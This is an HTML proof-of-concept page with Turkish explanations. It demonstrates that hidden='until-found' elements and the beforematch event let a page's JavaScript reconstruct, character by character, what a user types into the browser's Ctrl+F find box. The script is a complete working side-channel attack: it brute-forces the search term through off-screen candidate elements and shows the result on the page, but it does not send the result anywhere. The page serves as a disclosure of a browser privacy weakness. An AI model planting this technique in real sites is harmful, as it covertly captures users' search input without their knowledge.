<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ctrl+F until-found PoC</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
  body {
    background:#f8f9fa;
    color:#212529;
  }
  .card {
    border-radius: 10px;
  }
  .log {
    background:#ffffff;
    font-family: monospace;
    font-size: 14px;
    padding: 12px;
    border-radius: 8px;
    min-height: 90px;
    border: 1px solid #dee2e6;
  }
  code {
    color:#0d6efd;
  }
</style>
</head>
<body>

<div class="container my-5">

  <!-- KullanÄ±cÄ±ya talimat -->
  <div class="card shadow-sm mb-4">
    <div class="card-body">
      <h4 class="mb-2">ğŸ” Ctrl+F Testi</h4>
      <p class="mb-1">
        Klavyeden <strong>Ctrl + F</strong> yapÄ±n ve arama kutusuna ÅŸunu yazÄ±n:
      </p>
      <h5 class="text-primary">beykozunsesi</h5>
      <p class="text-muted mb-0">
        Sayfada herhangi bir input veya form yoktur.
      </p>
    </div>
  </div>

  <!-- SonuÃ§ -->
  <div class="card shadow-sm mb-4">
    <div class="card-body">
      <h6 class="mb-2">ğŸ“¡ AlgÄ±lanan Arama Dizisi</h6>
      <div id="result" class="log text-success">
        Bekleniyor...
      </div>
    </div>
  </div>

  <!-- AÃ§Ä±klama -->
  <div class="card shadow-sm">
    <div class="card-body">
      <h5 class="mb-3">ğŸ§  Burada Ne Oluyor?</h5>

      <p>
        Bu sayfa, tarayÄ±cÄ±larÄ±n sunduÄŸu <code>hidden="until-found"</code> Ã¶zelliÄŸinin
        nasÄ±l bir <strong>side-channel veri sÄ±zÄ±ntÄ±sÄ±na</strong> dÃ¶nÃ¼ÅŸebileceÄŸini gÃ¶sterir.
      </p>

      <ul>
        <li>
          Sayfada gÃ¶rÃ¼nmeyen HTML elementleri bulunmaktadÄ±r.
        </li>
        <li>
          Bu elementler normalde gizlidir ancak tarayÄ±cÄ± iÃ§i arama
          (<strong>Ctrl+F</strong>) tarafÄ±ndan indekslenir.
        </li>
        <li>
          KullanÄ±cÄ± arama yaptÄ±ÄŸÄ±nda, eÅŸleÅŸen gizli element tarayÄ±cÄ± tarafÄ±ndan
          otomatik olarak gÃ¶rÃ¼nÃ¼r hale getirilir.
        </li>
        <li>
          Bu gÃ¶rÃ¼nÃ¼r olma anÄ± <code>beforematch</code> olayÄ± ile JavaScript tarafÄ±ndan algÄ±lanÄ±r.
        </li>
      </ul>

      <p class="mb-0">
        SonuÃ§ olarak kullanÄ±cÄ± yalnÄ±zca sayfa iÃ§inde arama yaptÄ±ÄŸÄ±nÄ± sanÄ±rken,
        JavaScript arka planda aranan kelimeyi <strong>harf harf</strong> Ã§Ã¶zebilmektedir.
        Bu iÅŸlem sÄ±rasÄ±nda <strong>keydown, input veya izin</strong> kullanÄ±lmaz.
      </p>
    </div>
  </div>

</div>

<!-- until-found adaylarÄ± -->
<div id="search-candidates"
     style="position:absolute; left:-9999px; top:-9999px;"></div>

<script>
let detectedSequence = "";
const detected = new Set();
let container;

function cleanupOldCandidates(len) {
  if (!container) return;
  container.querySelectorAll('p[id^="c_"]').forEach(el => {
    const l = el.getAttribute("data-sequence").length;
    if (l !== 1 && (l < len || l > len + 1)) {
      el.remove();
    }
  });
}

function generateCandidates(prefix = "") {
  if (!container) return;

  const charset =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

  if (prefix.length > 0) cleanupOldCandidates(prefix.length);

  for (let i = 0; i < charset.length; i++) {
    const seq = prefix + charset[i];
    const id = "c_" + encodeURIComponent(seq);

    if (container.querySelector("#" + CSS.escape(id))) continue;

    const p = document.createElement("p");
    p.hidden = "until-found";
    p.id = id;
    p.setAttribute("data-sequence", seq);
    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;

    p.style.fontSize = "1px";
    p.style.margin = "0";
    p.style.padding = "0";
    p.style.lineHeight = "1px";

    p.addEventListener("beforematch", () => {
      const current = p.getAttribute("data-sequence");

      if (current.length === 1) {
        detectedSequence = current;
        document.getElementById("result").textContent = current;
        detected.add(id);
        generateCandidates(current);
        return;
      }

      if (!detected.has(id) && current.length > detectedSequence.length) {
        detected.add(id);

        const prevId = "c_" + encodeURIComponent(detectedSequence);
        const prev = container.querySelector("#" + CSS.escape(prevId));
        if (prev) {
          prev.setAttribute("hidden", "until-found");
          detected.delete(prevId);
        }

        detectedSequence = current;
        document.getElementById("result").textContent = current;
        generateCandidates(current);
      }
    });

    container.appendChild(p);
  }
}

window.addEventListener("load", () => {
  container = document.getElementById("search-candidates");
  generateCandidates();
});
</script>

</body>
</html>
